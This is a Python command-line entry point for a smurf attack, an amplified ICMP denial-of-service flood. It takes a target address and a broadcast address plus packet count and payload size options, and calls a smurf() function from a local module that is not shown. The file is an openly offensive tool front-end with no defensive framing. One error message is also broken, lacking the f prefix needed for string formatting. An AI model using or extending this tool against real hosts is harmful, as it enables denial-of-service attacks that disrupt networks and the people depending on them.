#!/usr/bin/env python3
import logging
import argparse
import sys

from utils.smurf import smurf
import constants as const


logging.basicConfig(
    level=logging.INFO,
    format='%(message)s')
LOG = logging.getLogger(__name__)


def _parse_args():
    parser = argparse.ArgumentParser(
        description='Smurf attack')
    parser.add_argument('target')
    parser.add_argument('broadcast')
    parser.add_argument('-c', '--count', type=int, default=1,
                        help='stop after sending COUNT packets')
    parser.add_argument('-s', '--payload-size', type=int, default=56,
                        help='size of packet payload')
    args = parser.parse_args()

    if args.count <= 0:
        print('COUNT must be positive!')
        sys.exit(0)
    if args.payload_size < const.MIN_PAYLOAD_SIZE:
        print('PAYLOAD_SIZE must be greater than {const.MIN_PAYLOAD_SIZE}!')
        sys.exit(0)

    return args


def main():
    args = _parse_args()
    smurf(args.target, args.broadcast, args.count, args.payload_size)


if __name__ == '__main__':
    main()
